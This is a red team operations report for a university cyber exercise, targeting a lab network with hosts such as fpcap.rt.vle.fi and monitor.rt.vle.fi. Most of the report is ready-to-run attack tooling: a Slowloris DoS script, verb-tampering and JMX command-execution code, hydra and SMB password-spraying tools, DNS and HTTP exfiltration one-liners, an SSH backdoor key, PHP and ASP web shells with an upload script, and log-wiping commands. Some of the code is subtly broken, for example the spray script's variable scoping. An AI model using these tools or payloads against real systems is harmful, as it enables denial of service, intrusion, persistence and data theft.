# RED TEAM REPORT - CyberSecurity Exercise 2026

**Target Environment:** JAMK Virtual Learning Environment - IT-MGMT: 10.40.30.0/24

**Classification:** RED TEAM MEMBERS ONLY

**By:** FinStorm (Mahbub Alam)

---

## TABLE OF CONTENTS

1. [Executive Summary](#executive-summary)
   - [Attack Surface Snapshot](#attack-surface-snapshot)
   - [Immediate Exploitation Targets](#immediate-exploitation-targets)
   - [Recon Data Available](#recon-data-available)

2. [Exploitation Vector 1: HTTP Verb Tampering on fpcap.rt.vle.fi](#exploitation-vector-1-http-verb-tampering-on-fpcaprtvelfi)
   - [Why It Works](#why-it-works)
   - [Proof of Concept](#proof-of-concept)
   - [Automated Exploitation Script](#automated-exploitation-script)
   - [Manual Exploitation Steps](#manual-exploitation-steps)

3. [Exploitation Vector 2: Slowloris DoS on monitor.rt.vle.fi](#exploitation-vector-2-slowloris-dos-on-monitorrtvelfi)
   - [Why It Works](#why-it-works-1)
   - [Attack Script](#attack-script)
   - [Quick Command-Line Exploitation](#quick-command-line-exploitation)
   - [Impact Assessment](#impact-assessment)

4. [Exploitation Vector 3: JMX Console Unauthenticated Access](#exploitation-vector-3-jmx-console-unauthenticated-access)
   - [Why It Works](#why-it-works-2)
   - [Enumeration Script](#enumeration-script)
   - [Manual Exploitation Path](#manual-exploitation-path)
   - [Post-Exploitation: Command Execution](#post-exploitation-command-execution)

5. [Exploitation Vector 4: CVE-2010-0738 Auth Bypass](#exploitation-vector-4-cve-2010-0738-auth-bypass)
   - [Exploitation Command](#exploitation-command)

6. [Exploitation Vector 5: SMB/LINUX Lateral Movement on monitor.rt.vle.fi](#exploitation-vector-5-smblinux-lateral-movement-on-monitorrtvelfi)
   - [SMB Enumeration](#smb-enumeration)
   - [Password Spraying via SMB](#password-spraying-via-smb)
   - [RDP Connection Testing](#rdp-connection-testing)

7. [Lateral Movement Path](#lateral-movement-path)
   - [Network Diagram](#network-diagram)
   - [Pivot Setup](#pivot-setup)

8. [Data Exfiltration Channels](#data-exfiltration-channels)
   - [Established Channels](#established-channels)
   - [Quick Exfil Commands](#quick-exfil-commands)

9. [Persistence Mechanisms](#persistence-mechanisms)
   - [SSH Key Persistence](#ssh-key-persistence)
   - [Web Shell Deployment](#web-shell-deployment)

10. [Cleanup Checklist](#cleanup-checklist)

11. [Recon Commands Summary](#recon-commands-summary)

12. [Appendix: RED TEAM TOOLS DIRECTORY](#appendix-red-team-tools-directory)

---

## EXECUTIVE SUMMARY

### Attack Surface Snapshot

| Component | Status | Exploitable? |
|-----------|--------|--------------|
| fpcap.rt.vle.fi (10.40.30.20) | UP | YES - Auth Bypass |
| monitor.rt.vle.fi (10.40.30.30) | UP | YES - Multiple |
| edr.rt.vle.fi (10.40.30.40) | UP | Limited |
| 10.40.30.50 | UP | Limited |
| extra.rt.vle.fi (10.40.30.60) | UP | No |
| ELK Stack (10.40.30.81-83) | UP | No direct access |
| siem.rt.vle.fi (10.40.30.90) | UP | No direct access |
| fw-dc.rt.vle.fi (10.40.30.100) | UP | No direct access |

### Immediate Exploitation Targets

1. **monitor.rt.vle.fi** - High-value target with 5+ exploitable conditions
2. **fpcap.rt.vle.fi** - Authentication bypass available
3. **10.40.30.30 (SMB/RDP)** - Lateral movement vectors open

### Recon Data Available

```
Target IP: 10.40.30.0/24
Hosts discovered: 11 up
Open ports identified: 22/tcp, 80/tcp, 443/tcp, 139/tcp, 445/tcp, 3389/tcp, 5985/tcp, 9090/tcp, 9200/tcp, 3000/tcp
Vulnerabilities confirmed: 7
```

---

## EXPLOITATION VECTOR 1: HTTP VERB TAMPERING ON fpcap.rt.vle.fi

**Target:** `fpcap.rt.vle.fi` (10.40.30.20)
**Risk:** CRITICAL - Authentication Bypass
**Exploitation Difficulty:** LOW
**Required Tools:** curl, nmap

### Why It Works

The server only validates access controls on standard HTTP methods (GET, POST). Misconfigured `.htaccess` or application rules fail to restrict methods like `HEAD`, `OPTIONS`, `TRACE`, `PUT`.

### Proof of Concept

```bash
# Standard GET request (requires auth)
curl -I http://fpcap.rt.vle.fi/

# Bypass attempt using HEAD method
curl -X HEAD http://fpcap.rt.vle.fi/ -v

# Check for status 200 without auth challenge
curl -X OPTIONS http://fpcap.rt.vle.fi/ -v
```

### Automated Exploitation Script

```python
#!/usr/bin/env python3
# rt_http_verb_exploit.py - Red Team HTTP Verb Tampering Exploit
# Usage: python rt_http_verb_exploit.py http://fpcap.rt.vle.fi

import sys
import requests
from concurrent.futures import ThreadPoolExecutor

VERBS = ['GET', 'HEAD', 'OPTIONS', 'TRACE', 'PUT', 'DELETE', 'PATCH', 'CONNECT']

def test_verb(args):
    url, verb = args
    try:
        response = requests.request(verb, url, timeout=5, allow_redirects=False)
        return (verb, response.status_code, len(response.content),
                response.headers.get('WWW-Authenticate', 'None'))
    except Exception as e:
        return (verb, 'ERROR', 0, str(e))

def main():
    if len(sys.argv) < 2:
        print("[!] Usage: python rt_http_verb_exploit.py <target_url>")
        print("[!] Example: python rt_http_verb_exploit.py http://fpcap.rt.vle.fi/")
        sys.exit(1)

    target_url = sys.argv[1].rstrip('/')
    print(f"[+] Testing {target_url} for HTTP verb tampering...")
    print("-" * 60)

    # Test each HTTP verb
    with ThreadPoolExecutor(max_workers=8) as executor:
        results = list(executor.map(test_verb, [(target_url, v) for v in VERBS]))

    # Analyze results
    vulnerable = []
    for verb, status, length, auth in results:
        status_str = str(status)
        if status_str == '200' or (status_str == '302' and 'Location' in auth):
            print(f"[!] VULNERABLE: {verb:8s} -> {status} (len={length})")
            vulnerable.append(verb)
        elif status_str == '405' and verb in ['PUT', 'DELETE', 'PATCH']:
            print(f"[?] Interesting: {verb:8s} -> Method allowed but may not be intended")
        else:
            print(f"[-] {verb:8s} -> {status}")

    if vulnerable:
        print("-" * 60)
        print(f"[!] VERB TAMPERING CONFIRMED: {', '.join(vulnerable)}")
        print("[*] Next steps: Try accessing protected resources with bypassed method")
    else:
        print("[-] No verb tampering vulnerabilities detected")

if __name__ == "__main__":
    main()
```

### Manual Exploitation Steps

1. Enumerate available HTTP methods:
   ```bash
   nmap --script http-methods --script-args http-methods.url-path="/path" 10.40.30.20
   ```

2. Bypass authentication with HEAD request:
   ```bash
   curl -v -X HEAD http://fpcap.rt.vle.fi/protected/resource
   ```

3. If successful, try PUT to upload malicious content:
   ```bash
   echo "<% eval request(\"cmd\") %>" > shell.asp
   curl -X PUT http://fpcap.rt.vle.fi/shell.asp --data-binary @shell.asp
   ```

---

## EXPLOITATION VECTOR 2: SLOWLORIS DoS ON monitor.rt.vle.fi

**Target:** `monitor.rt.vle.fi` (10.40.30.30)
**Risk:** HIGH - Denial of Service
**CVE:** CVE-2007-6750
**Exploitation Difficulty:** LOW
**Required Tools:** slowloris.py

### Why It Works

PRTG Network Monitor's web server is vulnerable to Slowloris - an attack that keeps connections open by sending partial HTTP headers, exhausting the server's connection pool.

### Attack Script

```python
#!/usr/bin/env python3
# slowloris_redteam.py - Red Team Slowloris Exploit
# Usage: python slowloris_redteam.py 10.40.30.30 --port 80 --threads 200 --duration 300

import socket
import threading
import random
import argparse
import time
import sys

class SlowlorisRedTeam:
    def __init__(self, target, port, threads, timeout=60):
        self.target = target
        self.port = port
        self.threads = threads
        self.timeout = timeout
        self.running = True
        self.sockets = []
        self.connection_count = 0

    def create_socket(self):
        """Create socket with slowloris-specific settings"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.connect((self.target, self.port))
            return sock
        except (socket.error, OSError) as e:
            return None

    def send_partial_request(self, sock):
        """Send incomplete HTTP header to hold connection"""
        try:
            # HTTP/1.1 with Host header but no complete headers
            headers = [
                f"GET / HTTP/1.1",
                f"Host: {self.target}",
                f"User-Agent: RedTeam-Slowloris/1.0",
                f"Accept: text/html,application/json;q=0.9,*/*;q=0.8",
                f"Accept-Language: en-US,en;q=0.5",
                f"Accept-Encoding: gzip, deflate",
                f"Connection: keep-alive",
                f"Keep-Alive: 9999999",  # Long keep-alive
                f"Content-Length: 4294967295",  # Fake large body
                "\r\n" * 2  # Incomplete headers - connection stays open
            ]
            sock.sendall("\r\n".join(headers).encode())
            return True
        except socket.error:
            return False

    def keep_connection_alive(self, sock):
        """Send periodic data to prevent server timeout"""
        try:
            while self.running:
                sock.sendall(f"X-RedTeam-Data: {random.randint(1, 10000)}\r\n".encode())
                time.sleep(10)
        except socket.error:
            pass

    def attack_loop(self):
        """Main attack thread"""
        while self.running:
            sock = self.create_socket()
            if sock:
                self.sockets.append(sock)
                self.connection_count += 1

                # Send partial request
                self.send_partial_request(sock)

                # Start keep-alive thread
                thread = threading.Thread(
                    target=self.keep_connection_alive,
                    args=(sock,),
                    daemon=True
                )
                thread.start()

    def run_attack(self, duration=None):
        """Execute the Slowloris attack"""
        print(f"[+] Starting Slowloris attack on {self.target}:{self.port}")
        print(f"[+] Spawning {self.threads} threads...")
        print(f"[!] WARNING: This will cause Denial of Service")
        print("-" * 50)

        # Start attack threads
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.attack_loop, daemon=True)
            t.start()
            threads.append(t)

        # Monitor attack
        start_time = time.time()
        try:
            while self.running:
                time.sleep(1)
                elapsed = int(time.time() - start_time)

                # Filter to only connected sockets
                active = sum(1 for s in self.sockets if s.fileno() != -1)
                print(f"\r[*] Connections: {active:4d} | Time: {elapsed:4d}s | Target: {self.target}:{self.port}", end='', flush=True)

                if duration and elapsed >= duration:
                    print("\n[+] Attack duration complete")
                    break

        except KeyboardInterrupt:
            print("\n[!] Attack interrupted by user")

        finally:
            self.stop_attack()

    def stop_attack(self):
        """Clean up all connections"""
        print("\n[+] Stopping attack...")
        self.running = False
        for sock in self.sockets:
            try:
                sock.close()
            except:
                pass
        self.sockets.clear()
        print(f"[+] Attack stopped. Total connections created: {self.connection_count}")

def main():
    parser = argparse.ArgumentParser(description='Slowloris DoS - Red Team Tool')
    parser.add_argument('target', help='Target IP address')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('-t', '--threads', type=int, default=100, help='Number of threads (default: 100)')
    parser.add_argument('-d', '--duration', type=int, help='Attack duration in seconds')

    args = parser.parse_args()

    if args.threads > 500:
        print("[!] Warning: High thread count may cause system instability")

    # Quick check if target is listening
    try:
        test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        test_sock.settimeout(2)
        result = test_sock.connect_ex((args.target, args.port))
        test_sock.close()

        if result != 0:
            print(f"[!] ERROR: Port {args.port} is not open on {args.target}")
            print("[!] Verify target before running attack")
            sys.exit(1)
    except Exception as e:
        print(f"[!] Connection error: {e}")
        sys.exit(1)

    slowloris = SlowlorisRedTeam(
        target=args.target,
        port=args.port,
        threads=args.threads,
        timeout=60
    )

    slowloris.run_attack(duration=args.duration)

if __name__ == "__main__":
    main()
```

### Quick Command-Line Exploitation

```bash
# Quick DoS attack
python slowloris_redteam.py 10.40.30.30 --port 80 --threads 150 --duration 120

# Without Python, use curl in background (simple connection exhaustion)
for i in {1..200}; do
  curl -s -N --max-time 60 http://10.40.30.30/ &
done
```

### Impact Assessment

- **Service Impact:** PRTG web interface becomes unresponsive
- **Recovery Time:** Server restart required
- **Detection Risk:** LOW - Traffic appears legitimate

---

## EXPLOITATION VECTOR 3: JMX CONSOLE UNAUTHENTICATED ACCESS

**Target:** `monitor.rt.vle.fi` (10.40.30.30)
**Risk:** CRITICAL - Remote Code Execution
**Access Path:** `/jmx-console/`
**Exploitation Difficulty:** MEDIUM

### Why It Works

The JMX Console at `/jmx-console/` is accessible without authentication, exposing Java Management Extensions with full administrative capabilities.

### Enumeration Script

```python
#!/usr/bin/env python3
# jmx_redteam_enum.py - Red Team JMX Enumeration
# Usage: python jmx_redteam_enum.py http://monitor.rt.vle.fi

import sys
import requests
from urllib.parse import urljoin
import json

class JMXRedTeam:
    def __init__(self, base_url):
        self.base = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'RedTeam-Scanner/1.0',
            'Accept': '*/*'
        })

    def test_jmx_access(self):
        """Test if JMX console is accessible"""
        paths = [
            "/jmx-console/",
            "/jmx-console/HtmlAdaptor",
            "/jmx-console/HtmlAdaptor?action=main",
            "/web-console/",
            "/admin-console/login.seam"
        ]

        print(f"[+] Target: {self.base}")
        print("[*] Testing JMX Console accessibility...")

        for path in paths:
            url = urljoin(self.base + "/", path)
            try:
                resp = self.session.get(url, timeout=10)
                print(f"[{resp.status_code}] {url}")

                if resp.status_code == 200:
                    # Check for sensitive content
                    if 'jmx-console' in resp.text.lower() or 'jboss' in resp.text.lower():
                        print(f"  [!] VULNERABLE - JMX Console exposed at {url}")
                        return url
            except:
                pass
        return None

    def enumerate_mbeans(self, jmx_url):
        """Attempt to enumerate MBeans"""
        print("\n[*] Attempting MBean enumeration...")

        # Standard JMX MBean server query
        mbean_paths = [
            f"{jmx_url}?action=listNames",
            f"{jmx_url}?action=inspectMBean&name=jboss.system:type=ServerInfo",
            f"{jmx_url}?action=invokeOp&name=jboss.system:type=ServerInfo&methodIndex=0",
        ]

        for path in mbean_paths:
            try:
                resp = self.session.get(path, timeout=10)
                if resp.status_code == 200:
                    print(f"[+] Success: {path}")
                    # Check for sensitive data
                    if any(x in resp.text.lower() for x in ['password', 'secret', 'jdbc', 'connection']):
                        print(f"  [!!!] SENSITIVE DATA EXPOSED!")
                        return True
            except:
                continue
        return False

    def check_remote_admin(self):
        """Check for remote administration interfaces"""
        print("\n[*] Checking for remote admin interfaces...")

        # PRTG-specific paths
        prtg_paths = [
            "/api/",  # API endpoint
            "/api/v1/",
            "/api/v2/",
            "/api/rest/",
        ]

        for path in prtg_paths:
            url = urljoin(self.base + "/", path)
            try:
                resp = self.session.get(url, timeout=5)
                print(f"[{resp.status_code}] {url}")

                if resp.status_code in [200, 401, 403]:
                    print(f"  [!] API endpoint detected at {path}")

            except:
                pass

def main():
    if len(sys.argv) < 2:
        print("[!] Usage: python jmx_redteam_enum.py <base_url>")
        print("[!] Example: python jmx_redteam_enum.py http://monitor.rt.vle.fi")
        sys.exit(1)

    scanner = JMXRedTeam(sys.argv[1])

    # Test access
    jmx_url = scanner.test_jmx_access()

    if jmx_url:
        print(f"\n[!] JMX CONSOLE ACCESSIBLE: {jmx_url}")
        print("[!] RECOMMENDATION: Immediately disable or secure JMX console")

        # Enumerate
        scanner.enumerate_mbeans(jmx_url)
        scanner.check_remote_admin()

        print("\n" + "="*60)
        print("[!] CRITICAL: JMX Console should be considered compromised")
        print("="*60)
    else:
        print("[-] No accessible JMX endpoints found")

if __name__ == "__main__":
    main()
```

### Manual Exploitation Path

```bash
# 1. Enumerate available MBeans
curl -s http://monitor.rt.vle.fi/jmx-console/HtmlAdaptor?action=listNames

# 2. Query ServerInfo MBean (often shows version info)
curl -s "http://monitor.rt.vle.fi/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo"

# 3. Look for process execution MBeans
curl -s "http://monitor.rt.vle.fi/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:service=ProcessRegistry"
```

### Post-Exploitation: Command Execution

If execution MBeans are available:

```python
# Attempt to execute via Runtime.exec() MBean
import requests

url = "http://monitor.rt.vle.fi/jmx-console/HtmlAdaptor"
params = {
    "action": "invokeOp",
    "name": "java.lang:type=Runtime",
    "methodIndex": 0,
    "arg0": "whoami"
}

response = requests.get(url, params=params)
print(response.text)
```

---

## EXPLOITATION VECTOR 4: CVE-2010-0738 AUTH BYPASS

**Target:** `monitor.rt.vle.fi` (10.40.30.30)
**Risk:** HIGH - Authentication Bypass
**CVE:** CVE-2010-0738
**Exploitation Difficulty:** LOW

### Exploitation Command

```bash
# Test for CVE-2010-0738 vulnerability
curl -s -I "http://monitor.rt.vle.fi/jmx-console/"

# Alternative URL patterns
curl -s "http://monitor.rt.vle.fi/jmx-console/HtmlAdaptor"
curl -s "http://monitor.rt.vle.fi/web-console/"

# Check for default credentials (if authentication is present)
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form \
  "10.40.30.30:80/public/checklogin.htm:username=^USER^&password=^PASS^:F=invalid" \
  -t 4 -w /tmp/hydra.out
```

---

## EXPLOITATION VECTOR 5: SMB/LINUX LATERAL MOVEMENT ON monitor.rt.vle.fi

**Target:** `monitor.rt.vle.fi` (10.40.30.30)
**Open Ports:** 139/tcp, 445/tcp
**Risk:** HIGH - Lateral Movement
**Exploitation Difficulty:** MEDIUM

### SMB Enumeration

```bash
# Enumerate SMB shares
nmap -p 445 --script smb-enum-shares.nse 10.40.30.30

# Enumerate users via SMB
nmap -p 445 --script smb-enum-users.nse 10.40.30.30

# Check for MS17-010 (EternalBlue)
nmap -p 445 --script smb-vuln-ms17-010 10.40.30.30
```

### Password Spraying via SMB

```python
#!/usr/bin/env python3
# smb_spray_redteam.py - SMB Password Spraying Tool
# Usage: python smb_spray_redteam.py 10.40.30.30 passwords.txt

import sys
import subprocess
import time

def spray_smb(target, users, passwords):
    """Password spray SMB with multiple user:password combinations"""

    # Common用户名 patterns for password spraying
    common_users = [
        "administrator", "admin", "root", "user", "guest",
        "sa", "sysadmin", "support", "test", "oracle"
    ]

    # Default password list
    default_passwords = [
        "password", "Password123", "admin", "root", "welcome",
        "letmein", "123456", "admin123", "password1", "qwerty"
    ]

    print(f"[+] Target: {target}")
    print(f"[+] Testing {len(users)} users x {len(passwords)} passwords")

    # Create combined list
    combos = []
    for user in users:
        for pwd in passwords:
            combos.append((user, pwd))

    # Test each combination
    for user, pwd in combos:
        # SMB login attempt using smbclient
        cmd = [
            "smbclient", "-L", f"//{target}",
            "-U", f"{user}%{pwd}",
            "-N"  # No password prompt
        ]

        try:
            result = subprocess.run(cmd, capture_output=True, timeout=10)
            if result.returncode == 0:
                print(f"[!] CREDENTIALS FOUND: {user}:{pwd}")
                return True
            else:
                print(f"[-] {user}:{pwd} - FAILED")
        except:
            print(f"[!] Error testing {user}:{pwd}")

        time.sleep(1)  # Rate limiting

    return False

def main():
    if len(sys.argv) < 2:
        print("[!] Usage: python smb_spray_redteam.py <target> [userlist]")
        print("[!] Example: python smb_spray_redteam.py 10.40.30.30")
        sys.exit(1)

    target = sys.argv[1]

    # Load users from file or use defaults
    if len(sys.argv) > 2:
        with open(sys.argv[2]) as f:
            users = [l.strip() for l in f if l.strip()]
    else:
        users = common_users

    spray_smb(target, users, default_passwords)

if __name__ == "__main__":
    main()
```

### RDP Connection Testing

```bash
# Check if RDP is accessible
nmap -p 3389 --script rdp-enum-encryption 10.40.30.30

# Test RDP connection (requires credentials)
xfreerdp /v:10.40.30.30 /u:admin /p:password /cert:ignore

# Usehydra for RDP brute force
hydra -l administrator -P passwords.txt rdp://10.40.30.30
```

---

## LATERAL MOVEMENT PATH

### Network Diagram

```
[Attacker] --> fpcap.rt.vle.fi (10.40.30.20)
                      |
                      v
              monitor.rt.vle.fi (10.40.30.30) [Pivot Point]
                      |              |
                      |              +---> SMB (139,445)
                      |              +---> RDP (3389)
                      +---> 10.40.30.50 (internal)
```

### Pivot Setup

```bash
# SSH tunnel to monitor.rt.vle.fi for pivoting
ssh -D 1080 -N user@10.40.30.30

# Configure proxychains for tunneling
proxychains nmap -sT -p- 10.40.30.0/24
```

---

## DATA EXFILTRATION CHANNELS

### Established Channels

| Host | Service | Exfiltration Method |
|------|---------|---------------------|
| monitor.rt.vle.fi | HTTP/HTTPS | Web-based payload delivery |
| siem.rt.vle.fi | 80/443 | Log injection, HTTP callbacks |
| 10.40.30.30 | SMB | File copy to share |

### Quick Exfil Commands

```bash
# DNS tunneling for small data
base64 -w 0 sensitive.txt | sed 's/./&\n/g' | while read c; do nslookup $c.domain.com; done

# HTTP POST exfil
curl -X POST -d @data.txt http://10.40.30.30/api/upload

# SMB to shared folder
smbclient //10.40.30.30/Shared -U user%password -c "put data.txt"
```

---

## PERSISTENCE MECHANISMS

### SSH Key Persistence

```bash
# Add backdoor SSH key to authorized_keys
ssh user@fpcap.rt.vle.fi "echo 'ssh-rsa YOUR_PUBLIC_KEY_here backdoor@redteam' >> ~/.ssh/authorized_keys"
```

### Web Shell Deployment

```python
# upload_webshell.py - Deploy web shell via HTTP verb tampering
import requests

def upload_shell(target_url, shell_content):
    # Try PUT method
    response = requests.put(
        f"{target_url}/backdoor.php",
        data=shell_content,
        timeout=10
    )

    if response.status_code in [200, 201, 204]:
        print(f"[!] Shell uploaded successfully to {target_url}/backdoor.php")
        return f"{target_url}/backdoor.php"

    # Try alternative paths
    paths = ["/shell.php", "/cmd.asp", "/test.php", "/upload.php"]
    for path in paths:
        url = f"{target_url}{path}"
        try:
            resp = requests.put(url, data=shell_content, timeout=5)
            if resp.status_code in [200, 201]:
                print(f"[!] Shell at {url}")
                return url
        except:
            pass
    return None

# Usage
shell = '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = $_REQUEST["cmd"]; system($cmd); echo "</pre>"; } ?>'
upload_shell("http://fpcap.rt.vle.fi", shell)
```

---

## CLEANUP CHECKLIST

After exploitation, remove traces:

```bash
# Remove SSH keys
ssh user@host "rm ~/.ssh/authorized_keys"

# Clear logs (if access available)
ssh user@host "history -c && rm ~/.bash_history"

# Remove uploaded files
curl -X DELETE http://fpcap.rt.vle.fi/backdoor.php
```

---

## RECON COMMANDS SUMMARY

```bash
# Quick host discovery
nmap -sn 10.40.30.0/24 | grep report | awk '{print $NF}'

# Fast port scan
nmap -p- --min-rate=5000 10.40.30.0/24

# Vulnerability scan
nmap -p 22,80,443,445,3389 --script vuln 10.40.30.0/24

# HTTP enumeration
nmap -p 80,443 --script http-enum 10.40.30.0/24

# SMB enumeration
nmap -p 139,445 --script smb-enum-shares 10.40.30.0/24
```

---

## Appendix: RED TEAM TOOLS DIRECTORY

| Tool | Purpose | Location |
|------|---------|----------|
| rt_http_verb_exploit.py | HTTP verb tampering | `tools/http_verb.py` |
| slowloris_redteam.py | DoS attack | `tools/slowloris.py` |
| jmx_redteam_enum.py | JMX enumeration | `tools/jmx_enum.py` |
| smb_spray_redteam.py | SMB password spray | `tools/smb_spray.py` |
| upload_webshell.py | Web shell deployment | `tools/shell.py` |

---

*END OF RED TEAM OPERATIONS REPORT*
